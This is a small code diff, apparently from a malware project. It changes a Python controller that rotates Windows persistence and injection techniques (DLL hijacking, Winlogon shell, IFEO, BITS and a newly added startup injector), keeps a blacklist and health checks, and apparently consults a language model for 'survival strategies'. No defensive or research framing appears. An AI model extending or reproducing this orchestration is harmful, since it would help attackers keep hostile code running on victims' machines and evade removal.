@@ -9,7 +9,7 @@ from strategy_generator import get_survival_strategy
 from brain_executor import ask_dolphin_for_strategy
 
 # --- GLOBAL STATE ---
-ACTIVE_TECHNIQUE = "bits_injector.cpp" # Starting technique
+ACTIVE_TECHNIQUE = "startup_injector.cpp" # Starting technique
 BLACKLIST = []
 
 def log_event(message):
@@ -66,7 +66,8 @@ def check_health(technique_file):
         "dll_hijack_iexplore.cpp": "dll_hijack_iexplore",
         "winlogon_shell.cpp": "winlogon_shell",
         "ifeo_injector.cpp": "ifeo_injector",
-        "bits_injector.cpp": "bits_injector"
+        "bits_injector.cpp": "bits_injector",
+        "startup_injector.cpp": "startup_injector"
     }
     
     # Fallback to the base filename without extension if not in mapping
